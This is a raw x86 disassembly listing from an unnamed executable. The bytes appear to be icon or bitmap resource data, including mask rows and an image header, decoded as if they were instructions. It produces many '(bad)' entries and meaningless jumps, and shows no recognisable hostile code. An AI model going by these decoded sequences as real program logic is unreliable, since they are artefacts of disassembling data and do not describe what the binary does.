  404bbd:	ea fb ff ff de fc ff 	ljmp   $0xfffc,$0xdefffffb
  404bc4:	ff 0f                	decl   (%edi)
  404bc6:	99                   	cltd
  404bc7:	cf                   	iret
  404bc8:	ff 02                	incl   (%edx)
  404bca:	02 02                	add    (%edx),%al
  404bcc:	5e                   	pop    %esi
  404bcd:	00 00                	add    %al,(%eax)
  404bcf:	00 18                	add    %bl,(%eax)
  404bd1:	00 00                	add    %al,(%eax)
  404bd3:	00 01                	add    %al,(%ecx)
  404bd5:	00 00                	add    %al,(%eax)
  404bd7:	00 01                	add    %al,(%ecx)
	...
  404c0d:	00 8d c6 21 10 99    	add    %cl,-0x66efde3a(%ebp)
  404c13:	cf                   	iret
  404c14:	ff                   	ljmp   (bad)
  404c15:	ea f6 fc ff fa fd ff 	ljmp   $0xfffd,$0xfafffcf6
  404c1c:	ff                   	(bad)
  404c1d:	fa                   	cli
  404c1e:	fd                   	std
  404c1f:	ff                   	(bad)
  404c20:	ff e2                	jmp    *%edx
  404c22:	fd                   	std
  404c23:	ff                   	(bad)
  404c24:	ff e2                	jmp    *%edx
  404c26:	fd                   	std
  404c27:	ff                   	(bad)
  404c28:	ff ca                	dec    %edx
  404c2a:	fc                   	cld
  404c2b:	ff                   	(bad)
  404c2c:	ff c3                	inc    %ebx
  404c2e:	fc                   	cld
  404c2f:	ff                   	(bad)
  404c30:	ff b1 fc ff ff c3    	push   -0x3c000004(%ecx)
  404c36:	fc                   	cld
  404c37:	ff                   	(bad)
  404c38:	ff                   	(bad)
  404c39:	fa                   	cli
  404c3a:	fd                   	std
  404c3b:	ff                   	(bad)
  404c3c:	ff 4e b3             	decl   -0x4d(%esi)
  404c3f:	dc ff                	fdivr  %st,%st(7)
  404c41:	01 4b 67             	add    %ecx,0x67(%ebx)
  404c44:	9f                   	lahf
  404c45:	00 00                	add    %al,(%eax)
  404c47:	00 24 00             	add    %ah,(%eax,%eax,1)
  404c4a:	00 00                	add    %al,(%eax)
  404c4c:	04 00                	add    $0x0,%al
	...
  404c5a:	00 00                	add    %al,(%eax)
  404c5c:	01 00                	add    %eax,(%eax)
  404c5e:	00 00                	add    %al,(%eax)
  404c60:	01 00                	add    %eax,(%eax)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	01 00                	add    %eax,(%eax)
  404c66:	8d                   	lea    (bad),%eax
  404c67:	c6                   	(bad)
  404c68:	21 00                	and    %eax,(%eax)
  404c6a:	8a c0                	mov    %al,%al
  404c6c:	44                   	inc    %esp
  404c6d:	00 89 be 67 00 8a    	add    %cl,-0x75ff9842(%ecx)
  404c73:	c0 88 00 8c c4 b6 00 	rorb   $0x0,-0x493b7400(%eax)
  404c7a:	8d                   	lea    (bad),%eax
  404c7b:	c5 c6 00             	(bad)
  404c7e:	92                   	xchg   %eax,%edx
  404c7f:	cc                   	int3
  404c80:	ff 00                	incl   (%eax)
  404c82:	92                   	xchg   %eax,%edx
  404c83:	cc                   	int3
  404c84:	ff 00                	incl   (%eax)
  404c86:	86 bb ad 00 00 00    	xchg   %bh,0xad(%ebx)
  404c8c:	18 00                	sbb    %al,(%eax)
  404c8e:	00 00                	add    %al,(%eax)
  404c90:	06                   	push   %es
	...
  404cd1:	00 90 ca a1 20 a0    	add    %dl,-0x5fdf5e36(%eax)
  404cd7:	d2 ff                	sar    %cl,%bh
  404cd9:	40                   	inc    %eax
  404cda:	ae                   	scas   %es:(%edi),%al
  404cdb:	d9 ff                	fcos
  404cdd:	60                   	pusha
  404cde:	bb df ff 80 c9       	mov    $0xc980ffdf,%ebx
  404ce3:	e6 ff                	out    %al,$0xff
  404ce5:	8f                   	(bad)
  404ce6:	cf                   	iret
  404ce7:	e9 ff bf e4 f2       	jmp    0xf3250ceb
  404cec:	ff cf                	dec    %edi
  404cee:	eb f5                	jmp    0x404ce5
  404cf0:	ff                   	(bad)
  404cf1:	ff                   	(bad)
  404cf2:	ff                   	(bad)
  404cf3:	ff                   	(bad)
  404cf4:	ff                   	(bad)
  404cf5:	ff                   	(bad)
  404cf6:	ff                   	(bad)
  404cf7:	ff                   	(bad)
  404cf8:	ff 8f cf e9 ff 00    	decl   0xffe9cf(%edi)
  404cfe:	7e b0                	jle    0x404cb0
  404d00:	dd 00                	fldl   (%eax)
  404d02:	00 00                	add    %al,(%eax)
  404d04:	37                   	aaa
  404d05:	00 00                	add    %al,(%eax)
  404d07:	00 0a                	add    %cl,(%edx)
	...
  404d35:	00 00                	add    %al,(%eax)
  404d37:	00 01                	add    %al,(%ecx)
  404d39:	00 00                	add    %al,(%eax)
  404d3b:	00 01                	add    %al,(%ecx)
  404d3d:	00 00                	add    %al,(%eax)
  404d3f:	00 01                	add    %al,(%ecx)
  404d41:	00 00                	add    %al,(%eax)
  404d43:	00 01                	add    %al,(%ecx)
  404d45:	00 00                	add    %al,(%eax)
  404d47:	00 01                	add    %al,(%ecx)
  404d49:	00 00                	add    %al,(%eax)
  404d4b:	00 01                	add    %al,(%ecx)
	...
  404d95:	00 00                	add    %al,(%eax)
  404d97:	00 01                	add    %al,(%ecx)
  404d99:	00 8d c6 42 00 84    	add    %cl,-0x7bffbd3a(%ebp)
  404d9f:	b8 47 00 8a c0       	mov    $0xc08a0047,%eax
  404da4:	77 00                	ja     0x404da6
  404da6:	89 be 89 00 8c c2    	mov    %edi,-0x3d73ff77(%esi)
  404dac:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404dad:	00 8d c5 c6 00 8e    	add    %cl,-0x71ff393b(%ebp)
  404db3:	c6                   	(bad)
  404db4:	d5 00                	aad    $0x0
  404db6:	92                   	xchg   %eax,%edx
  404db7:	cc                   	int3
  404db8:	ff 00                	incl   (%eax)
  404dba:	8e c7                	mov    %edi,%es
  404dbc:	e4 00                	in     $0x0,%al
  404dbe:	4f                   	dec    %edi
  404dbf:	6e                   	outsb  %ds:(%esi),(%dx)
  404dc0:	3b 00                	cmp    (%eax),%eax
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	0b 00                	or     (%eax),%eax
  404dc6:	00 00                	add    %al,(%eax)
  404dc8:	01 00                	add    %eax,(%eax)
	...
  404e6a:	00 00                	add    %al,(%eax)
  404e6c:	01 00                	add    %eax,(%eax)
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	01 00                	add    %eax,(%eax)
  404e72:	00 00                	add    %al,(%eax)
  404e74:	01 00                	add    %eax,(%eax)
  404e76:	00 00                	add    %al,(%eax)
  404e78:	01 00                	add    %eax,(%eax)
  404e7a:	00 00                	add    %al,(%eax)
  404e7c:	01 00                	add    %eax,(%eax)
  404e7e:	00 00                	add    %al,(%eax)
  404e80:	01 00                	add    %eax,(%eax)
	...
  405372:	00 00                	add    %al,(%eax)
  405374:	00 ff                	add    %bh,%bh
  405376:	ff                   	(bad)
  405377:	ff                   	(bad)
  405378:	ff                   	(bad)
  405379:	ff                   	(bad)
  40537a:	ff 00                	incl   (%eax)
  40537c:	00 ff                	add    %bh,%bh
  40537e:	ff                   	(bad)
  40537f:	ff                   	(bad)
  405380:	ff                   	(bad)
  405381:	ff                   	(bad)
  405382:	ff 00                	incl   (%eax)
  405384:	00 ff                	add    %bh,%bh
  405386:	ff                   	(bad)
  405387:	ff                   	(bad)
  405388:	ff                   	(bad)
  405389:	ff                   	(bad)
  40538a:	ff 00                	incl   (%eax)
  40538c:	00 ff                	add    %bh,%bh
  40538e:	ff                   	(bad)
  40538f:	ff                   	(bad)
  405390:	ff                   	(bad)
  405391:	ff                   	(bad)
  405392:	ff 00                	incl   (%eax)
  405394:	00 ff                	add    %bh,%bh
  405396:	ff                   	(bad)
  405397:	ff                   	(bad)
  405398:	ff                   	(bad)
  405399:	ff                   	(bad)
  40539a:	ff 00                	incl   (%eax)
  40539c:	00 ff                	add    %bh,%bh
  40539e:	9f                   	lahf
  40539f:	ff                   	(bad)
  4053a0:	ff                   	(bad)
  4053a1:	ff                   	(bad)
  4053a2:	ff 00                	incl   (%eax)
  4053a4:	00 ff                	add    %bh,%bh
  4053a6:	01 ff                	add    %edi,%edi
  4053a8:	ff                   	(bad)
  4053a9:	ff                   	(bad)
  4053aa:	ff 00                	incl   (%eax)
  4053ac:	00 fe                	add    %bh,%dh
  4053ae:	00 0f                	add    %cl,(%edi)
  4053b0:	ff                   	(bad)
  4053b1:	ff                   	(bad)
  4053b2:	ff 00                	incl   (%eax)
  4053b4:	00 fc                	add    %bh,%ah
  4053b6:	00 00                	add    %al,(%eax)
  4053b8:	ff                   	(bad)
  4053b9:	ff                   	(bad)
  4053ba:	ff 00                	incl   (%eax)
  4053bc:	00 fc                	add    %bh,%ah
  4053be:	00 00                	add    %al,(%eax)
  4053c0:	0f ff ff             	ud0    %edi,%edi
  4053c3:	00 00                	add    %al,(%eax)
  4053c5:	fc                   	cld
  4053c6:	00 00                	add    %al,(%eax)
  4053c8:	00 ff                	add    %bh,%bh
  4053ca:	ff 00                	incl   (%eax)
  4053cc:	00 fc                	add    %bh,%ah
  4053ce:	00 00                	add    %al,(%eax)
  4053d0:	00 07                	add    %al,(%edi)
  4053d2:	ff 00                	incl   (%eax)
  4053d4:	00 fc                	add    %bh,%ah
  4053d6:	00 00                	add    %al,(%eax)
  4053d8:	00 01                	add    %al,(%ecx)
  4053da:	ff 00                	incl   (%eax)
  4053dc:	00 fc                	add    %bh,%ah
  4053de:	00 00                	add    %al,(%eax)
  4053e0:	00 01                	add    %al,(%ecx)
  4053e2:	ff 00                	incl   (%eax)
  4053e4:	00 fc                	add    %bh,%ah
  4053e6:	00 00                	add    %al,(%eax)
  4053e8:	00 01                	add    %al,(%ecx)
  4053ea:	ff 00                	incl   (%eax)
  4053ec:	00 fc                	add    %bh,%ah
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 01                	add    %al,(%ecx)
  4053f2:	ff 00                	incl   (%eax)
  4053f4:	00 fc                	add    %bh,%ah
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 01                	add    %al,(%ecx)
  4053fa:	ff 00                	incl   (%eax)
  4053fc:	00 fc                	add    %bh,%ah
  4053fe:	00 00                	add    %al,(%eax)
  405400:	00 01                	add    %al,(%ecx)
  405402:	ff 00                	incl   (%eax)
  405404:	00 fc                	add    %bh,%ah
  405406:	00 00                	add    %al,(%eax)
  405408:	00 00                	add    %al,(%eax)
  40540a:	ff 00                	incl   (%eax)
  40540c:	00 fc                	add    %bh,%ah
  40540e:	00 00                	add    %al,(%eax)
  405410:	00 00                	add    %al,(%eax)
  405412:	ff 00                	incl   (%eax)
  405414:	00 fc                	add    %bh,%ah
  405416:	00 00                	add    %al,(%eax)
  405418:	00 00                	add    %al,(%eax)
  40541a:	ff 00                	incl   (%eax)
  40541c:	00 fc                	add    %bh,%ah
  40541e:	00 00                	add    %al,(%eax)
  405420:	00 00                	add    %al,(%eax)
  405422:	ff 00                	incl   (%eax)
  405424:	00 f8                	add    %bh,%al
  405426:	00 00                	add    %al,(%eax)
  405428:	00 00                	add    %al,(%eax)
  40542a:	ff 00                	incl   (%eax)
  40542c:	00 f8                	add    %bh,%al
  40542e:	00 00                	add    %al,(%eax)
  405430:	00 00                	add    %al,(%eax)
  405432:	ff 00                	incl   (%eax)
  405434:	00 f8                	add    %bh,%al
  405436:	00 00                	add    %al,(%eax)
  405438:	00 00                	add    %al,(%eax)
  40543a:	ff 00                	incl   (%eax)
  40543c:	00 f8                	add    %bh,%al
  40543e:	00 00                	add    %al,(%eax)
  405440:	00 00                	add    %al,(%eax)
  405442:	ff 00                	incl   (%eax)
  405444:	00 f8                	add    %bh,%al
  405446:	00 00                	add    %al,(%eax)
  405448:	00 00                	add    %al,(%eax)
  40544a:	7f 00                	jg     0x40544c
  40544c:	00 f8                	add    %bh,%al
  40544e:	00 00                	add    %al,(%eax)
  405450:	00 00                	add    %al,(%eax)
  405452:	7f 00                	jg     0x405454
  405454:	00 f8                	add    %bh,%al
  405456:	00 00                	add    %al,(%eax)
  405458:	00 00                	add    %al,(%eax)
  40545a:	7f 00                	jg     0x40545c
  40545c:	00 f8                	add    %bh,%al
  40545e:	00 00                	add    %al,(%eax)
  405460:	00 00                	add    %al,(%eax)
  405462:	7f 00                	jg     0x405464
  405464:	00 f8                	add    %bh,%al
  405466:	00 00                	add    %al,(%eax)
  405468:	00 00                	add    %al,(%eax)
  40546a:	7f 00                	jg     0x40546c
  40546c:	00 f8                	add    %bh,%al
  40546e:	00 00                	add    %al,(%eax)
  405470:	00 00                	add    %al,(%eax)
  405472:	7f 00                	jg     0x405474
  405474:	00 f8                	add    %bh,%al
  405476:	00 00                	add    %al,(%eax)
  405478:	00 00                	add    %al,(%eax)
  40547a:	7f 00                	jg     0x40547c
  40547c:	00 f8                	add    %bh,%al
  40547e:	00 00                	add    %al,(%eax)
  405480:	00 00                	add    %al,(%eax)
  405482:	7f 00                	jg     0x405484
  405484:	00 f8                	add    %bh,%al
  405486:	00 00                	add    %al,(%eax)
  405488:	00 00                	add    %al,(%eax)
  40548a:	7f 00                	jg     0x40548c
  40548c:	00 f8                	add    %bh,%al
  40548e:	00 00                	add    %al,(%eax)
  405490:	00 00                	add    %al,(%eax)
  405492:	7f 00                	jg     0x405494
  405494:	00 fc                	add    %bh,%ah
  405496:	00 00                	add    %al,(%eax)
  405498:	00 00                	add    %al,(%eax)
  40549a:	ff 00                	incl   (%eax)
  40549c:	00 fc                	add    %bh,%ah
  40549e:	00 06                	add    %al,(%esi)
  4054a0:	00 03                	add    %al,(%ebx)
  4054a2:	ff 00                	incl   (%eax)
  4054a4:	00 fe                	add    %bh,%dh
  4054a6:	00 0f                	add    %cl,(%edi)
  4054a8:	fc                   	cld
  4054a9:	07                   	pop    %es
  4054aa:	ff 00                	incl   (%eax)
  4054ac:	00 fe                	add    %bh,%dh
  4054ae:	00 1f                	add    %bl,(%edi)
  4054b0:	ff                   	(bad)
  4054b1:	ff                   	(bad)
  4054b2:	ff 00                	incl   (%eax)
  4054b4:	00 ff                	add    %bh,%bh
  4054b6:	e0 3f                	loopne 0x4054f7
  4054b8:	ff                   	(bad)
  4054b9:	ff                   	(bad)
  4054ba:	ff 00                	incl   (%eax)
  4054bc:	00 ff                	add    %bh,%bh
  4054be:	ff                   	(bad)
  4054bf:	ff                   	(bad)
  4054c0:	ff                   	(bad)
  4054c1:	ff                   	(bad)
  4054c2:	ff 00                	incl   (%eax)
  4054c4:	00 ff                	add    %bh,%bh
  4054c6:	ff                   	(bad)
  4054c7:	ff                   	(bad)
  4054c8:	ff                   	(bad)
  4054c9:	ff                   	(bad)
  4054ca:	ff 00                	incl   (%eax)
  4054cc:	00 ff                	add    %bh,%bh
  4054ce:	ff                   	(bad)
  4054cf:	ff                   	(bad)
  4054d0:	ff                   	(bad)
  4054d1:	ff                   	(bad)
  4054d2:	ff 00                	incl   (%eax)
  4054d4:	00 ff                	add    %bh,%bh
  4054d6:	ff                   	(bad)
  4054d7:	ff                   	(bad)
  4054d8:	ff                   	(bad)
  4054d9:	ff                   	(bad)
  4054da:	ff 00                	incl   (%eax)
  4054dc:	00 ff                	add    %bh,%bh
  4054de:	ff                   	(bad)
  4054df:	ff                   	(bad)
  4054e0:	ff                   	(bad)
  4054e1:	ff                   	(bad)
  4054e2:	ff 00                	incl   (%eax)
  4054e4:	00 ff                	add    %bh,%bh
  4054e6:	ff                   	(bad)
  4054e7:	ff                   	(bad)
  4054e8:	ff                   	(bad)
  4054e9:	ff                   	(bad)
  4054ea:	ff 00                	incl   (%eax)
  4054ec:	00 ff                	add    %bh,%bh
  4054ee:	ff                   	(bad)
  4054ef:	ff                   	(bad)
  4054f0:	ff                   	(bad)
  4054f1:	ff                   	(bad)
  4054f2:	ff 00                	incl   (%eax)
  4054f4:	00 28                	add    %ch,(%eax)
  4054f6:	00 00                	add    %al,(%eax)
  4054f8:	00 20                	add    %ah,(%eax)
  4054fa:	00 00                	add    %al,(%eax)
  4054fc:	00 40 00             	add    %al,0x0(%eax)
  4054ff:	00 00                	add    %al,(%eax)
  405501:	01 00                	add    %eax,(%eax)
  405503:	20 00                	and    %al,(%eax)
  405505:	00 00                	add    %al,(%eax)
  405507:	00 00                	add    %al,(%eax)
  405509:	80 10 00             	adcb   $0x0,(%eax)
	...
  405648:	00 03                	add    %al,(%ebx)
  40564a:	01 00                	add    %eax,(%eax)
  40564c:	01 02                	add    %eax,(%edx)
  40564e:	02 02                	add    (%edx),%al
  405650:	01 00                	add    %eax,(%eax)
	...
  4056b2:	00 00                	add    %al,(%eax)
  4056b4:	03 00                	add    (%eax),%eax
  4056b6:	00 00                	add    %al,(%eax)
  4056b8:	29 0e                	sub    %ecx,(%esi)
  4056ba:	00 00                	add    %al,(%eax)
  4056bc:	29 18                	sub    %ebx,(%eax)
  4056be:	01 00                	add    %eax,(%eax)
  4056c0:	10 15 01 00 07 14    	adc    %dl,0x14070001
  4056c6:	01 00                	add    %eax,(%eax)
  4056c8:	01 00                	add    %eax,(%eax)
	...
  40572e:	88 bd 0a 0e 80 ad    	mov    %bh,-0x527ff1f6(%ebp)
  405734:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405735:	04 5a                	add    $0x5a,%al
  405737:	7c d5                	jl     0x40570e
  405739:	00 32                	add    %dh,(%edx)
  40573b:	48                   	dec    %eax
  40573c:	b6 00                	mov    $0x0,%dh
  40573e:	1d 2b 95 00 09       	sbb    $0x900952b,%eax
  405743:	0d 74 04 00 00       	or     $0x474,%eax
  405748:	4c                   	dec    %esp
  405749:	08 00                	or     %al,(%eax)
  40574b:	00 2e                	add    %ch,(%esi)
  40574d:	0c 00                	or     $0x0,%al
  40574f:	00 1c 14             	add    %bl,(%esp,%edx,1)
  405752:	1c 20                	sbb    $0x20,%al
  405754:	0b 00                	or     (%eax),%eax
	...
  40576e:	00 00                	add    %al,(%eax)
  405770:	01 00                	add    %eax,(%eax)
	...
  4057ae:	8a c0                	mov    %al,%al
  4057b0:	6c                   	insb   (%dx),%es:(%edi)
  4057b1:	5e                   	pop    %esi
  4057b2:	c3                   	ret
  4057b3:	ed                   	in     (%dx),%eax
  4057b4:	ff 5a c6             	lcall  *-0x3a(%edx)
  4057b7:	f7 ff                	idiv   %edi
  4057b9:	36 b4 ed             	ss mov $0xed,%ah
  4057bc:	ff 27                	jmp    *(%edi)
  4057be:	9b                   	fwait
  4057bf:	ce                   	into
  4057c0:	fe 0f                	decb   (%edi)
  4057c2:	7d aa                	jge    0x40576e
  4057c4:	f1                   	int1
  4057c5:	00 5d 82             	add    %bl,-0x7e(%ebp)
  4057c8:	dd 00                	fldl   (%eax)
  4057ca:	45                   	inc    %ebp
  4057cb:	61                   	popa
  4057cc:	c4 00                	les    (%eax),%eax
  4057ce:	22 33                	and    (%ebx),%dh
  4057d0:	a0 00 00 00 77       	mov    0x77000000,%al
  4057d5:	00 00                	add    %al,(%eax)
  4057d7:	00 59 05             	add    %bl,0x5(%ecx)
  4057da:	00 00                	add    %al,(%eax)
  4057dc:	3a 12                	cmp    (%edx),%dl
  4057de:	01 00                	add    %eax,(%eax)
  4057e0:	1c 14                	sbb    $0x14,%al
  4057e2:	01 00                	add    %eax,(%eax)
  4057e4:	0c 0c                	or     $0xc,%al
  4057e6:	39 48 05             	cmp    %ecx,0x5(%eax)
	...
  40582d:	00 8c c4 b5 75 cb ee 	add    %cl,-0x11348a4b(%esp,%eax,8)
  405834:	fd                   	std
  405835:	86 da                	xchg   %bl,%dl
  405837:	ff                   	(bad)
  405838:	fa                   	cli
  405839:	72 d2                	jb     0x40580d
  40583b:	ff                   	(bad)
  40583c:	fd                   	std
  40583d:	70 d2                	jo     0x405811
  40583f:	ff                   	(bad)
  405840:	fe                   	(bad)
  405841:	67 d1 ff             	addr16 sar $1,%edi
  405844:	ff 5c cd ff          	lcall  *-0x1(%ebp,%ecx,8)
  405848:	ff 42 b7             	incl   -0x49(%edx)
  40584b:	eb ff                	jmp    0x40584c
  40584d:	28 a0 d3 ff 15 8e    	sub    %ah,-0x71ea002d(%eax)
  405853:	bf f9 08 6c 94       	mov    $0x946c08f9,%edi
  405858:	e7 00                	out    %eax,$0x0
  40585a:	47                   	inc    %edi
  40585b:	64 c8 00 26 39       	fs enter $0x2600,$0x39
  405860:	a8 00                	test   $0x0,%al
  405862:	14 1f                	adc    $0x1f,%al
  405864:	8a 00                	mov    (%eax),%al
  405866:	00 00                	add    %al,(%eax)
  405868:	60                   	pusha
  405869:	03 00                	add    (%eax),%eax
  40586b:	00 3d 08 00 00 26    	add    %bh,0x26000008
  405871:	12 01                	adc    (%ecx),%al
  405873:	00 13                	add    %dl,(%ebx)
  405875:	85 89 88 04 00 00    	test   %ecx,0x488(%ecx)
	...
  4058ab:	00 00                	add    %al,(%eax)
  4058ad:	00 88 c2 b7 71 c7    	add    %cl,-0x388e483e(%eax)
  4058b3:	e9 ff 88 dd fe       	jmp    0xff1de1b7
  4058b8:	fc                   	cld
  4058b9:	6b d0 fd             	imul   $0xfffffffd,%eax,%edx
  4058bc:	ff 72 d3             	push   -0x2d(%edx)
  4058bf:	fe                   	(bad)
  4058c0:	fe                   	(bad)
  4058c1:	75 d3                	jne    0x405896
  4058c3:	fe                   	(bad)
  4058c4:	fe                   	(bad)
  4058c5:	76 d4                	jbe    0x40589b
  4058c7:	fe                   	(bad)
  4058c8:	fd                   	std
  4058c9:	77 d6                	ja     0x4058a1
  4058cb:	ff                   	(bad)
  4058cc:	fd                   	std
  4058cd:	79 db                	jns    0x4058aa
  4058cf:	ff                   	(bad)
  4058d0:	fe                   	(bad)
  4058d1:	71 d7                	jno    0x4058aa
  4058d3:	ff                   	(bad)
  4058d4:	ff 5d cc             	lcall  *-0x34(%ebp)
  4058d7:	fb                   	sti
  4058d8:	ff 4a c2             	decl   -0x3e(%edx)
  4058db:	f3 ff 34 b0          	repz push (%eax,%esi,4)
  4058df:	e2 ff                	loop   0x4058e0
  4058e1:	1f                   	pop    %ds
  4058e2:	91                   	xchg   %eax,%ecx
  4058e3:	bd f8 08 6f 99       	mov    $0x996f08f8,%ebp
  4058e8:	e8 00 55 78 d5       	call   0xd5b8aded
  4058ed:	00 35 4b b4 00 0f    	add    %dh,0xf00b44b
  4058f3:	19 8c 00 00 00 69 00 	sbb    %ecx,0x690000(%eax,%eax,1)
  4058fa:	00 00                	add    %al,(%eax)
  4058fc:	4c                   	dec    %esp
  4058fd:	04 00                	add    $0x0,%al
  4058ff:	00 2e                	add    %ch,(%esi)
  405901:	00 00                	add    %al,(%eax)
  405903:	00 0f                	add    %cl,(%edi)
	...
  405925:	00 93 ce 01 00 00    	add    %dl,0x1ce(%ebx)
  40592b:	00 00                	add    %al,(%eax)
  40592d:	00 84 bf be 67 c2 e6 	add    %al,-0x193d9842(%edi,%edi,4)
  405934:	ff 90 e3 ff fb 70    	call   *0x70fbffe3(%eax)
  40593a:	d5 fd                	aad    $0xfd
  40593c:	ff 77 d9             	push   -0x27(%edi)
  40593f:	fe                   	(bad)
  405940:	fe                   	(bad)
  405941:	76 d8                	jbe    0x40591b
  405943:	fe                   	(bad)
  405944:	ff 76 d8             	push   -0x28(%esi)
  405947:	fe                   	(bad)
  405948:	fe                   	(bad)
  405949:	76 d8                	jbe    0x405923
  40594b:	fe                   	(bad)
  40594c:	fe                   	(bad)
  40594d:	76 d7                	jbe    0x405926
  40594f:	fe                   	(bad)
  405950:	fe                   	(bad)
  405951:	77 d8                	ja     0x40592b
  405953:	fe                   	(bad)
  405954:	fe                   	(bad)
  405955:	7b da                	jnp    0x405931
  405957:	ff                   	(bad)
  405958:	fd                   	std
  405959:	80 dd ff             	sbb    $0xff,%ch
  40595c:	fd                   	std
  40595d:	7d dc                	jge    0x40593b
  40595f:	ff                   	(bad)
  405960:	fd                   	std
  405961:	74 da                	je     0x40593d
  405963:	ff                   	(bad)
  405964:	ff 6b d9             	ljmp   *-0x27(%ebx)
  405967:	ff                   	(bad)
  405968:	ff 57 ca             	call   *-0x36(%edi)
  40596b:	f7 ff                	idiv   %edi
  40596d:	3d b3 e1 ff 21       	cmp    $0x21ffe1b3,%eax
  405972:	9c                   	pushf
  405973:	cc                   	int3
  405974:	fe                   	(bad)
  405975:	14 80                	adc    $0x80,%al
  405977:	ab                   	stos   %eax,%es:(%edi)
  405978:	f1                   	int1
  405979:	03 60 85             	add    -0x7b(%eax),%esp
  40597c:	da 00                	fiaddl (%eax)
  40597e:	35 4b b9 01 08       	xor    $0x801b94b,%eax
  405983:	0a 5f 00             	or     0x0(%edi),%bl
  405986:	00 00                	add    %al,(%eax)
  405988:	07                   	pop    %es
	...
  4059ad:	00 87 c5 db 6b c3    	add    %al,-0x3c94243b(%edi)
  4059b3:	e7 ff                	out    %eax,$0xff
  4059b5:	9b                   	fwait
  4059b6:	e9 ff fc 74 d9       	jmp    0xd9b556ba
  4059bb:	fe                   	(bad)
  4059bc:	ff                   	(bad)
  4059bd:	7b dd                	jnp    0x40599c
  4059bf:	fe                   	(bad)
  4059c0:	ff                   	(bad)
  4059c1:	7b dd                	jnp    0x4059a0
  4059c3:	ff                   	(bad)
  4059c4:	ff                   	(bad)
  4059c5:	7b dd                	jnp    0x4059a4
  4059c7:	ff                   	(bad)
  4059c8:	ff                   	(bad)
  4059c9:	7b dd                	jnp    0x4059a8
  4059cb:	fe                   	(bad)
  4059cc:	ff                   	(bad)
  4059cd:	7b dd                	jnp    0x4059ac
  4059cf:	ff                   	(bad)
  4059d0:	ff                   	(bad)
  4059d1:	7b dd                	jnp    0x4059b0
  4059d3:	fe                   	(bad)
  4059d4:	ff                   	(bad)
  4059d5:	7b dd                	jnp    0x4059b4
  4059d7:	fe                   	(bad)
  4059d8:	fe                   	(bad)
  4059d9:	7a dc                	jp     0x4059b7
  4059db:	fe                   	(bad)
  4059dc:	ff                   	(bad)
  4059dd:	7b dd                	jnp    0x4059bc
  4059df:	fe                   	(bad)
  4059e0:	fe                   	(bad)
  4059e1:	7c dd                	jl     0x4059c0
  4059e3:	fe                   	(bad)
  4059e4:	fe                   	(bad)
  4059e5:	7f de                	jg     0x4059c5
  4059e7:	fe                   	(bad)
  4059e8:	fd                   	std
  4059e9:	80 e0 ff             	and    $0xff,%al
  4059ec:	fd                   	std
  4059ed:	82 e2 ff             	and    $0xff,%dl
  4059f0:	fe 82 e4 ff ff 72    	incb   0x72ffffe4(%edx)
  4059f6:	db ff                	(bad)
  4059f8:	ff 5c d2 fb          	lcall  *-0x5(%edx,%edx,8)
  4059fc:	ff 19                	lcall  *(%ecx)
  4059fe:	94                   	xchg   %eax,%esp
  4059ff:	ca ff 00             	lret   $0xff
  405a02:	1e                   	push   %ds
  405a03:	2b 8f 00 00 00 0b    	sub    0xb000000(%edi),%ecx
	...
  405a2d:	02 8d ca dd 58 b9    	add    -0x46a72236(%ebp),%cl
  405a33:	e1 ff                	loope  0x405a34
  405a35:	9f                   	lahf
  405a36:	eb fe                	jmp    0x405a36
  405a38:	fd                   	std
  405a39:	7b e0                	jnp    0x405a1b
  405a3b:	fe                   	(bad)
  405a3c:	ff 80 e1 fe ff 80    	incl   -0x7f00011f(%eax)
  405a42:	e2 ff                	loop   0x405a43
  405a44:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  405a4a:	e2 ff                	loop   0x405a4b
  405a4c:	ff 80 e2 ff ff 80    	incl   -0x7f00001e(%eax)
  405a52:	e2 fe                	loop   0x405a52
  405a54:	ff 80 e2 fe ff 80    	incl   -0x7f00011e(%eax)
  405a5a:	e2 ff                	loop   0x405a5b
  405a5c:	ff 80 e2 fe ff 80    	incl   -0x7f00011e(%eax)
  405a62:	e2 fe                	loop   0x405a62
  405a64:	fe 80 e2 fe ff 80    	incb   -0x7f00011e(%eax)
  405a6a:	e2 fe                	loop   0x405a6a
  405a6c:	fe 80 e2 fe fe 7e    	incb   0x7efefee2(%eax)
  405a72:	e0 fd                	loopne 0x405a71
  405a74:	fe 82 e3 fe fd 8a    	incb   -0x7502011d(%edx)
  405a7a:	e6 ff                	out    %al,$0xff
  405a7c:	fb                   	sti
  405a7d:	31 a7 df fd 00 25    	xor    %esp,0x2500fddf(%edi)
  405a83:	36 9f                	ss lahf
  405a85:	00 00                	add    %al,(%eax)
  405a87:	00 11                	add    %dl,(%ecx)
	...
  405aad:	16                   	push   %ss
  405aae:	9d                   	popf
  405aaf:	d5 de                	aad    $0xde
  405ab1:	61                   	popa
  405ab2:	be e4 ff 9f eb       	mov    $0xeb9fffe4,%esi
  405ab7:	ff                   	(bad)
  405ab8:	fc                   	cld
  405ab9:	80 e6 fd             	and    $0xfd,%dh
  405abc:	ff 85 e5 fd ff 85    	incl   -0x7a00021b(%ebp)
  405ac2:	e7 ff                	out    %eax,$0xff
  405ac4:	ff 85 e7 ff ff 85    	incl   -0x7a000019(%ebp)
  405aca:	e7 ff                	out    %eax,$0xff
  405acc:	ff 85 e7 ff ff 85    	incl   -0x7a000019(%ebp)
  405ad2:	e7 ff                	out    %eax,$0xff
  405ad4:	ff 85 e7 ff ff 85    	incl   -0x7a000019(%ebp)
  405ada:	e7 ff                	out    %eax,$0xff
  405adc:	ff 85 e7 ff ff 85    	incl   -0x7a000019(%ebp)
  405ae2:	e7 ff                	out    %eax,$0xff
  405ae4:	ff 85 e7 ff ff 85    	incl   -0x7a000019(%ebp)
  405aea:	e7 fe                	out    %eax,$0xfe
  405aec:	ff 85 e7 ff ff 84    	incl   -0x7b000019(%ebp)
  405af2:	e6 ff                	out    %al,$0xff
  405af4:	ff 82 e5 fd ff 8a    	incl   -0x7500021b(%edx)
  405afa:	e7 fe                	out    %eax,$0xfe
  405afc:	fb                   	sti
  405afd:	39 b3 ee fe 00 31    	cmp    %esi,0x3100feee(%ebx)
  405b03:	46                   	inc    %esi
  405b04:	af                   	scas   %es:(%edi),%eax
